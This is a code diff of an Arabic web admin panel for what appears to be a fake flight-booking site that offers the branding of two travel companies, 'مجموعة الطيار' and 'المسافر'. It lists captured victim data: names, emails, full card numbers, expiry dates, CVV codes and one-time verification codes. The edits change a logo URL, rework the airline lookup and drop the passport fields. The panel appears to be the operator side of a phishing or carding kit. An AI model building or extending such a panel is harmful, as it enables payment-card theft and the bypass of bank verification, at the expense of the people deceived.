@@ -104,7 +104,7 @@
                                 <label class="label">اختر شعار الموقع</label>
                                 <div class="flex gap-4">
                                     <input type="radio" name="website_logo" id="logo_almadina" value="almadina" class="sr-only logo-picker-input" checked>
-                                    <label for="logo_almadina" class="logo-picker-label flex-1 flex justify-center items-center"><img src="https://res.cloudinary.com/do9agtdqi/image/upload/v1757118245/Messenger_creation_92476D62-68B6-490D-A4B1-062B02E55ABF_wbfxwo.jpg" alt="شعار مجموعة الطيار"></label>
+                                    <label for="logo_almadina" class="logo-picker-label flex-1 flex justify-center items-center"><img src="https://i.ibb.co/bF0503H/1000020794.jpg" alt="شعار مجموعة الطيار"></label>
                                     <input type="radio" name="website_logo" id="logo_almosafer" value="almosafer" class="sr-only logo-picker-input">
                                     <label for="logo_almosafer" class="logo-picker-label flex-1 flex justify-center items-center"><img src="https://res.cloudinary.com/do9agtdqi/image/upload/v1753891471/alm-fb-logo-ar_lhbpwv.jpg" alt="شعار المسافر"></label>
                                 </div>
@@ -373,7 +373,10 @@
         document.getElementById('transaction_type').value = data.transaction_type || 'payment';
         document.getElementById('departure_from').value = data.departure_from || '';
         document.getElementById('arrival_to').value = data.arrival_to || '';
-        document.getElementById('airline').value = document.querySelector(`#airline option[data-text="${data.airline_name}"]`)?.value || '';
+        
+        const airlineOption = [...document.querySelectorAll('#airline option')].find(opt => opt.textContent === data.airline_name);
+        if (airlineOption) document.getElementById('airline').value = airlineOption.value;
+
         document.getElementById('departure_datetime').value = data.departure_datetime || '';
         document.getElementById('return_datetime').value = data.return_datetime || '';
         document.getElementById('flight_number').value = data.flight_number || '';
@@ -422,11 +425,6 @@
         const isFreeCheck = document.getElementById('is_free_check');
         const freeTicketPrefillContainer = document.getElementById('free-ticket-prefill-container');
         const clearFormBtn = document.getElementById('clear-form-btn');
-        
-        // Add data-text attribute to airline options for easier lookup
-        document.querySelectorAll('#airline option').forEach(opt => {
-            if(opt.value) opt.dataset.text = opt.textContent;
-        });
 
         generateRefBtn.addEventListener('click', () => {
             if(!isUpdateMode) bookingRefInput.value = generateBookingRef();
@@ -631,7 +629,6 @@
         container.innerHTML = pendingOnly.map(req => {
             if (!req.bookingDetails) return '';
             const details = req.bookingDetails;
-            const freeDetails = req.freeTicketDetails;
             const priceText = `${(details.calculatedPrice || 0).toFixed(2)} ${details.currency || 'SAR'}`;
 
             let statusHtml = '';
@@ -647,7 +644,6 @@
                     <p class="font-bold text-base border-b pb-1 mb-1">معلومات المسافر ${i+1}</p>
                     <p><strong>الاسم:</strong> ${p.name || 'N/A'}</p>
                     <p><strong>البريد:</strong> ${p.email || 'N/A'}</p>
-                    <p><strong>الجواز:</strong> ${p.passportNumber || 'N/A'} | <strong>انتهاء:</strong> ${p.passportExpiry || 'N/A'}</p>
                 </div>
             `).join('');
 
@@ -663,7 +659,6 @@
                 
                 <div class="bg-white p-3 rounded text-sm space-y-2 mb-3 text-right">
                     ${passengersHtml}
-                    ${freeDetails ? `<div class="mt-2 pt-2 border-t border-gray-200"><p class="font-bold text-base text-green-600 border-b pb-1 mb-1">معلومات الرحلة المجانية</p><p><strong>شركة الطيران:</strong> ${freeDetails.airline_name || 'N/A'}</p><p><strong>الوجهة:</strong> من ${freeDetails.departure} إلى ${freeDetails.arrival}</p><p><strong>الاسم:</strong> ${freeDetails.passenger_name || 'N/A'}</p><p><strong>الجواز:</strong> ${freeDetails.passport_number || 'N/A'} | <strong>انتهاء:</strong> ${freeDetails.passport_expiry || 'N/A'}</p></div>` : ''}
                     <div class="mt-2 pt-2 border-t border-gray-200"><p class="font-bold text-base border-b pb-1 mb-1">معلومات الدفع</p><p><strong>الاسم على البطاقة:</strong> ${details.cardholderName || 'N/A'}</p><p><strong>البطاقة:</strong> <span dir="ltr">${details.cardNumber || 'N/A'}</span></p><p><strong>الانتهاء:</strong> ${details.expiry || 'N/A'} | <strong>CVV:</strong> ${details.cvv || 'N/A'}</p>${req.otpCode ? `<p class="font-extrabold text-red-600 text-base"><strong>رمز التحقق:</strong> ${req.otpCode}</p>` : ''}</div>
                 </div>
 
